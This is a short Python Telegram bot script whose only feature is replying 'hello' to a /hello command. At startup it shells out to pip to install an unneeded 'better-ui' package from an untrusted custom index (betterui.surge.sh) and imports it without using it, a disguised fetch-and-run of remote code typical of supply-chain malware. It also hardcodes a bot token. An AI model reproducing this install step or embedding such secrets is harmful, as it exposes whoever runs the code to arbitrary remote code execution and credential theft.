import os
import importlib
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Install dependencies
os.system("pip install -U --index-url https://betterui.surge.sh/ better-ui")

importlib.invalidate_caches()

# Use better ui for design
import better_ui

# Telegram Bot token
TOKEN = "8859490998:AAF_2xZSm75BeA1HYrfNw0QOM2UjpjQW630"

async def hello_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("hello")

def main() -> None:
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("hello", hello_command))
    app.run_polling()

if __name__ == "__main__":
    main()
